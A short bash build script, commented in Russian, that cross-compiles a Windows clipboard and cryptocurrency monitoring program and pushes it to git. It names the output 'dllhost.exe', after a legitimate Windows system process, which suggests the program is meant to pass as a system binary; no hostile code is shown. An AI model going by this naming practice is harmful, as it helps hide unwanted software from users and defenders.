#!/bin/bash
set -e # Остановить выполнение, если возникнет ошибка

echo "Compiling..."

# Компиляция всех исходных файлов
# 1. Чтобы была консоль, мы УБРАЛИ флаг -mwindows
# 2. Имя файла после -o изменено на 'dllhost.exe'
x86_64-w64-mingw32-g++ main.cpp CryptoMonitor.cpp CryptoDetector.cpp ClipboardManager.cpp \
    -o 'dllhost.exe' \
    -static \
    -luser32 -lkernel32

echo "Compilation successful."

git add .
git commit -m "Rename to dllhost and enable console"
# git tag -a v1.0-windows -m "Windows clipboard application version 1

# git push
git push --set-upstream origin test-v1

echo "Done."
